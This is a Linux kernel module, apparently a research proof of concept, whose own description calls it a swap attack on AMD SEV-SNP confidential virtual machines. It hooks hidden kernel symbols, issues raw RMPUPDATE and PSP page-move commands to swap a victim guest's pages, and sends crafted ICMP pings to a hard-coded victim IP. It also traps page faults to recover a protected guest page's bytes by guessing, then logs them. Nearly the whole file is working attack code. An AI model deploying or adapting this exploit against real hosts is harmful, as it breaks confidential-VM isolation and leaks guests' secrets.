#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/fs.h>
#include <linux/if_link.h>
#include <linux/ioctl.h>
#include <linux/module.h>
#include <linux/uaccess.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netdevice.h>
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/inet.h>
#include <linux/net.h>
#include <net/ip.h>
#include <net/icmp.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/socket.h>
#include <net/sock.h>
#include <linux/icmp.h>
#include <linux/inet.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/psp-sev.h>
#include <linux/psp.h>
#include <linux/module.h>
#include <asm/pgtable_types.h>
#include <asm/sev.h>
#include <linux/kvm_types.h>
#include <linux/kvm_host.h>
#include <linux/bits.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/mm.h>
#include <linux/gfp.h>
#include <asm/io.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <asm/cpu.h>
#include <asm/tdx.h>
#include <kvm/iodev.h>
#include <linux/kvm.h>
#include <linux/errno.h>
#include <linux/percpu.h>
#include <linux/mm.h>
#include <linux/miscdevice.h>
#include <linux/vmalloc.h>
#include <linux/reboot.h>
#include <linux/debugfs.h>
#include <linux/highmem.h>
#include <linux/file.h>
#include <linux/syscore_ops.h>
#include <linux/cpu.h>
#include <linux/sched/signal.h>
#include <linux/sched/mm.h>
#include <linux/sched/stat.h>
#include <linux/cpumask.h>
#include <linux/smp.h>
#include <linux/anon_inodes.h>
#include <linux/profile.h>
#include <linux/mman.h>
#include <linux/swap.h>
#include <linux/bitops.h>
#include <linux/spinlock.h>
#include <linux/compat.h>
#include <linux/srcu.h>
#include <linux/hugetlb.h>
#include <linux/slab.h>
#include <linux/io.h>
#include <linux/version.h>
#include <asm/processor.h>
#include <linux/kprobes.h>
#include <asm/svm.h>
#include <asm/sev-common.h>
#include <linux/kvm_host.h>
#include <linux/rcupdate.h>
#include <linux/spinlock.h>
#include <linux/delay.h>

#include "swap.h"
#include "protect.h"

#define VICTIM_IP "192.168.122.76"
#define ICMP_DATA_PAGE 0x465c000
#define MARKER_PAGE 0x465d000
#define SWAP_PAGE 0x4659000
#define VICTIM_PAGE 0x74ec3000
#define BYTES_PER_LINE 16

struct kvm *get_kvm_by_pid(pid_t pid);

extern bool debug_page_faults;
extern bool kvm_vcpu_read_protect_gfn(struct kvm_vcpu *vcpu, u64 gfn);
extern bool kvm_vcpu_write_protect_gfn(struct kvm_vcpu *vcpu, u64 gfn);
extern bool kvm_vcpu_exec_protect_gfn(struct kvm_vcpu *vcpu, u64 gfn,
				      bool flush_tlb);
extern atomic_long_t stop_at_fault_address;
extern atomic_long_t stopped_at;

extern atomic_t stop_at_fault;
extern atomic_t can_continue;
extern struct mutex continue_mutex;


static u64 __maybe_unused rmpupdate_pre_guest(u64 paddr, u32 asid){
	struct rmp_state state = {0};
	u64 ret;

	state.assigned = 1;
	state.pagesize = 0;
	state.immutable = 1;
	state.asid = asid;
	
	do {
		/* Binutils version 2.36 supports the RMPUPDATE mnemonic. */
		asm volatile(".byte 0xF2, 0x0F, 0x01, 0xFE"
			     : "=a" (ret)
			     : "a" (paddr), "c" ((unsigned long)&state)
			     : "memory", "cc");
	} while (ret == RMPUPDATE_FAIL_OVERLAP);

	return ret;
}

static u64 __maybe_unused rmpupdate_pre_swap(u64 paddr, u64 gpa, u32 asid){
    struct rmp_state state = {0};
    u64 ret;

    state.assigned = 1;
    state.pagesize = 0;
    state.immutable = 1;
    state.gpa = gpa;
    state.asid = asid;
    
    do {
        /* Binutils version 2.36 supports the RMPUPDATE mnemonic. */
        asm volatile(".byte 0xF2, 0x0F, 0x01, 0xFE"
                 : "=a" (ret)
                 : "a" (paddr), "c" ((unsigned long)&state)
                 : "memory", "cc");
    } while (ret == RMPUPDATE_FAIL_OVERLAP);

    return ret;
}

static void __maybe_unused hexdump(const void *addr, size_t len) {
    const unsigned char *ptr = addr;
    size_t i, j;

    for (i = 0; i < len; i += BYTES_PER_LINE) {
        printk(KERN_INFO "%08lx: ", (unsigned long)(ptr + i));
        for (j = 0; j < BYTES_PER_LINE; j++) {
            if (i + j < len)
                printk(KERN_CONT "%02x ", ptr[i + j]);
            else
                printk(KERN_CONT "   ");
        }

        printk(KERN_CONT " | \n");
    }
}
 
#define KPROBE_KALLSYMS_LOOKUP 

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

kallsyms_lookup_name_t kallsyms_lookup_name_func;
#define kallsyms_lookup_name kallsyms_lookup_name_func

static struct kprobe kp = {
	.symbol_name = "kallsyms_lookup_name"
};

int (*interruptfunc) (struct kvm_lapic *apic, int delivery_mode, int trig_mode, int vector);

u64* (*get_sptep) (struct kvm_vcpu *vcpu, gfn_t gfn, u64 *spte);

// The function needs the attribute __attribute__((__noinline__)) to avoid the compiler optimization
void (*__handle_changed_spte) (struct kvm *kvm, int as_id, gfn_t gfn,
				u64 old_spte, u64 new_spte, int level,
				bool shared);

bool (*__mmu_spte_update) (u64 *sptep, u64 new_spte);

void (*__tdp_iter_start) (struct tdp_iter *iter, struct kvm_mmu_page *root,
		    int min_level, gfn_t next_last_level_gfn);

void (*__dump_rmpentry) (u64 pfn);

bool (*__kvm_unmap_gfn_range)(struct kvm *kvm, struct kvm_gfn_range *range);

int (*__snp_page_reclaim) (struct kvm *kvm, u64 pfn);

struct list_head* _vm_list;
struct rmpentry *__rmptable;


static int init(void)
{

	#ifdef KPROBE_KALLSYMS_LOOKUP
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);

	if (!unlikely(kallsyms_lookup_name)) {
		pr_alert("Could not retrieve kallsyms_lookup_name address\n");
		return -ENXIO;
	}
	#endif

	_vm_list = (void*)kallsyms_lookup_name("vm_list");
	if (_vm_list == NULL)
	{
		pr_info("lookup failed vm_list\n");
		return -ENXIO;
	}
    get_sptep = (void*)kallsyms_lookup_name("kvm_tdp_mmu_fast_pf_get_last_sptep");
	if (get_sptep == NULL)
	{
		pr_info("lookup failed get_sptep\n");
		return -ENXIO;
	}
    __dump_rmpentry = (void*)kallsyms_lookup_name("dump_rmpentry");
	if (__dump_rmpentry == NULL)
	{
		pr_info("lookup failed dump_rmpentry\n");
		return -ENXIO;
	}
	__rmptable = (void*)kallsyms_lookup_name("rmptable");
	if (__rmptable == NULL)
	{
		pr_info("lookup failed __rmptable\n");
		return -ENXIO;
	}
	__snp_page_reclaim = (void*)kallsyms_lookup_name("snp_page_reclaim");
	if (__snp_page_reclaim == NULL)
	{
		pr_info("lookup failed __snp_page_reclaim\n");
		return -ENXIO;
	}
	__handle_changed_spte = (void*)kallsyms_lookup_name("handle_changed_spte");
	if (__handle_changed_spte == NULL)
	{
		pr_info("lookup failed __handle_changed_spte\n");
		return -ENXIO;
	}
	__mmu_spte_update = (void*)kallsyms_lookup_name("mmu_spte_update");
	if (__mmu_spte_update == NULL)
	{
		pr_info("lookup failed __mmu_spte_update\n");
		return -ENXIO;
	}
	__tdp_iter_start = (void*)kallsyms_lookup_name("tdp_iter_start");
	if (__tdp_iter_start == NULL)
	{
		pr_info("lookup failed __tdp_iter_start\n");
		return -ENXIO;
	}
	__kvm_unmap_gfn_range = (void*)kallsyms_lookup_name("kvm_unmap_gfn_range");
	if (__kvm_unmap_gfn_range == NULL)
	{
		pr_info("lookup failed __kvm_unmap_gfn_range\n");
		return -ENXIO;
	}

	return 0;
}

static int protect_page(struct kvm_vcpu* vcpu, int protection, uint64_t guest_frame)
{
	if (!vcpu) {
		pr_info("Unable to get vcpu* for this kvm/vcpuid");
		return -EINVAL;
	}

	switch (protection) {
	case PERM_R:

		// pr_info("protecting gfn=%lx from read, vcpu is %llx\n",
			// guest_frame, vcpu);
		kvm_vcpu_read_protect_gfn(vcpu, guest_frame);

		break;

	case PERM_W:

		// pr_info("protecting gfn=%lx from write, vcpu is %llx\n",
			// guest_frame, vcpu);
		kvm_vcpu_write_protect_gfn(vcpu, guest_frame);

		break;

	case PERM_X:
		// pr_info("protecting gfn=%lx from execute\n", guest_frame);
		kvm_vcpu_exec_protect_gfn(vcpu, guest_frame, true);
		break;

	default:
		pr_info("no such protection or not implemented");
		return -EINVAL;
	}

	return 0;
}

static uint16_t icmp_checksum(uint16_t *buf, int len)
{
    uint32_t sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1) {
        sum += *(uint8_t *)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

static int ping(int sequence, char *payload, size_t payload_len) {
	struct socket *sock;
    struct sockaddr_in daddr;
    struct msghdr msg;
    struct kvec iov;
    struct icmphdr icmp;
    // char payload[32] = "ping from kernel module";
	size_t packet_size = sizeof(struct icmphdr) + payload_len;
    char *packet = kzalloc(packet_size, GFP_KERNEL);
    int ret;

    ret = sock_create_kern(&init_net, AF_INET, SOCK_RAW, IPPROTO_ICMP, &sock);
    if (ret < 0) {
        printk(KERN_ERR "sock_create_kern failed: %d\n", ret);
        return ret;
    }

    memset(&icmp, 0, sizeof(icmp));
    icmp.type = ICMP_ECHO;
    icmp.code = 0;
    icmp.un.echo.id = htons(1234);
    icmp.un.echo.sequence = htons(sequence);

    memcpy(packet, &icmp, sizeof(icmp));
    memcpy(packet + sizeof(icmp), payload, payload_len);

    ((struct icmphdr *)packet)->checksum =
        icmp_checksum((uint16_t *)packet, packet_size);

    memset(&daddr, 0, sizeof(daddr));
    daddr.sin_family = AF_INET;
    daddr.sin_addr.s_addr = in_aton(VICTIM_IP);

    memset(&msg, 0, sizeof(msg));
    msg.msg_name = &daddr;
    msg.msg_namelen = sizeof(daddr);

    iov.iov_base = packet;
    iov.iov_len = packet_size;

    ret = kernel_sendmsg(sock, &msg, &iov, 1, iov.iov_len);

    if (ret < 0) {
        printk(KERN_ERR "kernel_sendmsg failed: %d\n", ret);
    }
    sock_release(sock);
	kfree(packet);
	return 0;
}

static u64 hpa_for_gpa(u64 gpa, struct kvm_vcpu* vcpu) {
    u64 spte;
    u64 *sptep;
	rcu_read_lock();
    sptep = get_sptep(vcpu, gpa >> PAGE_SHIFT, &spte);
	rcu_read_unlock();

    return spte & 0x0000FFFFFFFFF000ULL;
}

struct psp_sev_cmd_move {
    u64 guest_physical_addr;
    u32 page_size:1;
    u32 reserved:31;
    u32 reserved1;
	u64 src_paddr;
    u64 dst_paddr;
} __packed;

static int __maybe_unused psp_move_page(struct kvm *kvm, u64 hpa_src, u64 gpa_src, u64 hpa_dst){    
    struct kvm_sev_info *sev = &to_kvm_svm(kvm)->sev_info;
	struct psp_sev_cmd_move data = {0};
    u32 error = 0;
	int ret;

	rmpupdate_pre_swap(hpa_src, gpa_src, sev->asid);
	rmpupdate_pre_guest(hpa_dst, sev->asid);

    data.guest_physical_addr = __psp_pa(sev->snp_context);
    data.page_size = 0;
    data.src_paddr = (hpa_src);
    data.dst_paddr = (hpa_dst);

	// pr_info("hpa_src %llx ->, hpa_dst %llx\n", hpa_src, hpa_dst);
	// pr_info("snp_context %llx\n", (u64)sev->snp_context);
	// pr_info("gctx_paddr %llx\n", gctx_paddr);

    ret = sev_do_cmd(SEV_CMD_SNP_PAGE_MOVE, &data, &error);

	if (ret != 0) {
		pr_info("page move error value 0x%x\n", error);
		pr_info("page move ret value 0x%x\n",ret);
	}

    return ret;
}

// guess must be char[16]
static void ping_for_guess(char *guess) {
	char* payload = kmalloc(8900, GFP_KERNEL);
	payload[0] = 'x';
	payload[1] = 'y';

	for (size_t i = 0; i < 555; i++) {
		memcpy(payload + 2 + 16 * i, guess, 16);
	}

	ping(101, payload, 8900);
}

// Module initialization
static int __init protect_module_init(void)
{
	struct list_head* i;
	struct kvm_vcpu* vcpu;
	struct kvm* kvm = NULL;

	int ret = init();
	if (ret != 0)
	{
		pr_info("init failed!\n");
		return ret;
	}

	list_for_each(i, _vm_list)
	{
		kvm = list_entry(i, struct kvm, vm_list);

		pr_info("kvm location %p\n", kvm);

		if (atomic_read(&kvm->online_vcpus) == 0)
		{
			printk(KERN_INFO
			"no vcpus are online %d\n", atomic_read(&kvm->online_vcpus));
			return -1;
		}
		vcpu = xa_load(&kvm->vcpu_array, 0);
    }
	if (!kvm)
	{
		pr_info("kvm object not found\n");
		return -1;
	}

	// u64 gpa1 = 0x73025000;
	// u64 gpa2 = 0xcf63000;
	// u64 hpa1 = hpa_for_gpa(gpa1, vcpu);
	// hexdump(phys_to_virt(hpa1), 16);
	// u64 hpa2 = hpa_for_gpa(gpa2, vcpu);
	// psp_move_page(kvm, hpa2, gpa1, hpa1);
	// hexdump(phys_to_virt(hpa1), 16);
	// psp_move_page(kvm, hpa1, gpa2, hpa2);
	//
	// u64 hpa_data_1 = hpa_for_gpa(ICMP_DATA_PAGE, vcpu);
	// __dump_rmpentry(hpa_data_1 >> PAGE_SHIFT);
	// return 0;

	u64 hpa_victim = hpa_for_gpa(VICTIM_PAGE, vcpu);
	u64 hpa_save = hpa_for_gpa(SWAP_PAGE, vcpu);

	char *victim_page = phys_to_virt(hpa_victim);
	char victim_value[16];

	if (!victim_page){
		pr_info("Unable to map victim page\n");
		return -EINVAL;
	}

	int guesses[256] = {0};

	int retries = 0;

	u64 start = ktime_get_ns();
	for (size_t curr_byte = 0; curr_byte < 5; curr_byte++) {
		pr_info("At byte %luu", curr_byte);
		guesses[curr_byte] = -1;
		// hexdump(victim_page, 16);

		memcpy(victim_value, &victim_page[16 * curr_byte], 16);

		psp_move_page(kvm, hpa_victim, VICTIM_PAGE, hpa_save);

		bool done = false;
		for (char g = 0; g < 0xff && !done;) {
			pr_info("guess is %hhx", g);
			mdelay(5);// was 50

			char guess[16] = {0};
			memset(guess, 0, 16);
			guess[0] = g;

			// for (size_t i = 0; i < 3; i++) {
			// 	ping_for_guess(guess);
			// }
			//
			// mdelay(2);

			for (size_t i = 0; i < 2;) {
				atomic_xchg(&stop_at_fault, 1);
				protect_page(vcpu, PERM_W, MARKER_PAGE >> PAGE_SHIFT);
				protect_page(vcpu, PERM_R, MARKER_PAGE >> PAGE_SHIFT);

				atomic_xchg(&can_continue, 0);
				atomic_long_xchg(&stop_at_fault_address, MARKER_PAGE);
				mdelay(5);

				ping_for_guess(guess);

				mdelay(5);
				u64 stopped_at_val, start_time = ktime_get_ns();

				while(((stopped_at_val = atomic_long_read(&stopped_at)) == 0) && (ktime_get_ns() - start_time) < 150000);
				if (stopped_at_val != 0) {
					// pr_info("did fault\n");
					break; 
				}
				// pr_info("did not fault\n");
				i++;
			}

			u64 hpa_data = hpa_for_gpa(ICMP_DATA_PAGE, vcpu);
			hpa_victim = hpa_for_gpa(VICTIM_PAGE, vcpu);

			psp_move_page(kvm, hpa_data, ICMP_DATA_PAGE, hpa_victim);

			victim_page = phys_to_virt(hpa_victim);
			// hexdump(victim_page, 16);

			if (memcmp(victim_value, &victim_page[16 * curr_byte], 16) == 0){
				pr_info("Correct guess is %hhx\n", g);
				guesses[curr_byte] = (int) g;
				// hexdump(victim_page, 16);
				done = true;
			}

			psp_move_page(kvm, hpa_victim, ICMP_DATA_PAGE, hpa_data);

			atomic_xchg(&can_continue, 1);
			g++;
			// while(atomic_read(&can_continue) != 0);
		}

		if (guesses[curr_byte] == -1){
			guesses[curr_byte] = 0xff;
			if (retries < 5){
				pr_info("retrying..\n");
				curr_byte--;
				retries += 1;
			} 
		}

		psp_move_page(kvm, hpa_save, VICTIM_PAGE, hpa_victim);
	}

	atomic_xchg(&can_continue, 1);
	u64 stop = ktime_get_ns();
	u64 elapsed = stop - start;
	pr_info("Attack took %llu ms\n", elapsed / 1000000);

	for (size_t i = 0; i < 5; i++) {
		pr_info("Guessed 0x%hhx\n", guesses[i]);
	}

	return 0;
}


// Module cleanup
static void __exit protect_module_exit(void)
{
	pr_info("toggle_flag module unloaded\n");
}

module_init(protect_module_init);	
module_exit(protect_module_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("chriswe");
MODULE_DESCRIPTION("Old style swap attack against bytewise changing data");
